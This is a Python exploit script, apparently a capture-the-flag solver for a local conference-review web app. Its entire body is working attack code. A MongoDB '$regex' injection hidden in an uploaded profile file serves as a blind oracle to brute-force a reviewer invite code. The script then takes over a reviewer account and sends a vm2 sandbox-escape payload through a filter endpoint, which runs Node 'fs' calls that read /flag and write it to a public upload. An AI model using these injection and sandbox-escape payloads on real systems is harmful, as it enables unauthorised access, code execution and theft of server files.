#!/usr/bin/env python3
import json
import random
import re
import string
import sys
import time
from dataclasses import dataclass

import requests


MATCHED_TEXT = "Committee service desk has an available assignment slot."
INVITE_EMAIL = "committee-shadow@aaa26.big1"
INVITE_LENGTH = 36
INVITE_CHARSET = "0123456789abcdef"


def rand_suffix(length: int = 10) -> str:
    return "".join(random.choice(string.hexdigits.lower()[:16]) for _ in range(length))


def build_dummy_pdf() -> bytes:
    return (
        b"%PDF-1.4\n"
        b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
        b"2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]/Contents 4 0 R>>endobj\n"
        b"4 0 obj<</Length 44>>stream\n"
        b"BT /F1 12 Tf 72 120 Td (AAA26 local exploit) Tj ET\n"
        b"endstream endobj\n"
        b"xref\n0 5\n0000000000 65535 f \n"
        b"0000000010 00000 n \n0000000053 00000 n \n0000000110 00000 n \n0000000193 00000 n \n"
        b"trailer<</Size 5/Root 1 0 R>>\nstartxref\n290\n%%EOF\n"
    )


@dataclass
class Account:
    username: str
    email: str
    password: str


class ExploitClient:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "aaa26-local-solver"})

    def url(self, path: str) -> str:
        return f"{self.base_url}{path}"

    def register(self, account: Account) -> None:
        response = self.session.post(
            self.url("/register"),
            data={
                "username": account.username,
                "email": account.email,
                "password": account.password,
            },
            allow_redirects=False,
            timeout=10,
        )
        if response.status_code not in (302, 303):
            raise RuntimeError(f"register failed: HTTP {response.status_code}")

    def login(self, account: Account) -> None:
        response = self.session.post(
            self.url("/login"),
            data={"username": account.username, "password": account.password},
            allow_redirects=False,
            timeout=10,
        )
        if response.status_code not in (302, 303):
            raise RuntimeError(f"login failed: HTTP {response.status_code}")
        if "token" not in self.session.cookies.get_dict():
            raise RuntimeError("login failed: token cookie missing")

    def save_reviewer_profile(self, regex_value: str) -> None:
        payload = {
            "committee": {
                "registration": {
                    "reference": {
                        "$regex": regex_value
                    }
                }
            }
        }
        response = self.session.post(
            self.url("/reviewer/profile"),
            data={
                "track": "systems",
                "areas": "systems,review process,artifact sanity",
                "score": "100",
                "statement": "local exploit replay",
            },
            files={
                "profileFile": (
                    "profile.json",
                    json.dumps(payload).encode(),
                    "application/json",
                )
            },
            timeout=10,
        )
        if response.status_code != 200:
            raise RuntimeError(f"save profile failed: HTTP {response.status_code}")

    def submit_reviewer_profile(self) -> None:
        response = self.session.post(self.url("/reviewer/profile/submit"), timeout=10)
        if response.status_code != 200:
            raise RuntimeError(f"submit profile failed: HTTP {response.status_code}")
        if "Reviewer profile submitted for committee service sync." not in response.text:
            raise RuntimeError("submit profile failed: success message missing")

    def service_sync(self) -> bool:
        response = self.session.post(self.url("/reviewer/profile/service-sync"), timeout=10)
        if response.status_code != 200:
            raise RuntimeError(f"service sync failed: HTTP {response.status_code}")
        return MATCHED_TEXT in response.text

    def brute_invite_code(self) -> str:
        self.save_reviewer_profile("^")
        self.submit_reviewer_profile()
        prefix = ""
        while len(prefix) < INVITE_LENGTH:
            matched = False
            for char in INVITE_CHARSET:
                candidate = prefix + char
                self.save_reviewer_profile("^" + candidate)
                if self.service_sync():
                    prefix = candidate
                    matched = True
                    print(f"[+] invite prefix {len(prefix):02d}/{INVITE_LENGTH}: {prefix}")
                    break
            if not matched:
                raise RuntimeError(f"failed to extend invite prefix after {prefix!r}")
        return prefix

    def claim_reviewer(self, code: str) -> None:
        response = self.session.post(
            self.url("/reviewer/claim"),
            data={"email": INVITE_EMAIL, "code": code},
            allow_redirects=False,
            timeout=10,
        )
        if response.status_code not in (302, 303):
            raise RuntimeError(f"claim failed: HTTP {response.status_code}")
        location = response.headers.get("Location", "")
        if not location.startswith("/reviewer/assignments"):
            raise RuntimeError(f"claim failed: redirect was {location!r}")

    def upload_paper(self) -> str:
        response = self.session.post(
            self.url("/papers/new"),
            data={
                "title": "AAA26 local exploit artifact",
                "abstract": "Uploaded to create a writable public path for the vm2 overwrite.",
                "authors": "local solver, solver@example.com",
                "topics": "systems,security",
            },
            files={"pdf": ("artifact.pdf", build_dummy_pdf(), "application/pdf")},
            timeout=10,
        )
        if response.status_code != 200:
            raise RuntimeError(f"paper upload failed: HTTP {response.status_code}")
        match = re.search(r'href="(/public/uploads/[^"]+)"', response.text)
        if not match:
            raise RuntimeError("paper upload failed: public upload path not found in response")
        return match.group(1)

    def trigger_vm2_overwrite(self, public_pdf_path: str) -> None:
        target_path = "/app" + public_pdf_path
        body = (
            f'return process.mainModule.require("fs").writeFileSync('
            f'{json.dumps(target_path)}, '
            'process.mainModule.require("fs").readFileSync("/flag","utf8"))'
        )
        payload = (
            "(()=> {"
            "  const o = { __proto__: null };"
            "  try {"
            "    throw o;"
            "  } catch (e) {"
            "    e.f = Buffer.prototype.inspect;"
            "    o.f.constructor("
            + json.dumps(body)
            + ")();"
            "  }"
            "  return true;"
            "})()"
        )
        response = self.session.post(
            self.url("/api/reviewer/filter"),
            json={"expression": payload},
            timeout=10,
        )
        if response.status_code != 200:
            raise RuntimeError(f"filter request failed: HTTP {response.status_code}")

    def fetch_flag_text(self, public_pdf_path: str) -> str:
        response = self.session.get(self.url(public_pdf_path), timeout=10)
        if response.status_code != 200:
            raise RuntimeError(f"fetch overwritten file failed: HTTP {response.status_code}")
        return response.text.strip()


def main(argv: list[str]) -> int:
    base_url = argv[1] if len(argv) > 1 else "http://127.0.0.1:62303"
    random.seed()

    suffix = rand_suffix()
    account = Account(
        username=f"u{suffix}",
        email=f"u{suffix}@example.com",
        password="Passw0rd!",
    )

    client = ExploitClient(base_url)
    print(f"[*] target: {base_url}")
    print(f"[*] account: {account.username} / {account.password}")

    client.register(account)
    client.login(account)
    print("[*] logged in as ordinary user")

    invite_code = client.brute_invite_code()
    print(f"[+] reviewer invite code: {invite_code}")

    client.claim_reviewer(invite_code)
    print("[*] reviewer claim succeeded")

    public_pdf_path = client.upload_paper()
    print(f"[*] writable public path: {public_pdf_path}")

    client.trigger_vm2_overwrite(public_pdf_path)
    time.sleep(0.2)
    flag_text = client.fetch_flag_text(public_pdf_path)
    print(f"[+] fetched content: {flag_text}")

    if "flag{" not in flag_text:
        raise RuntimeError("flag marker not found in overwritten file")

    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
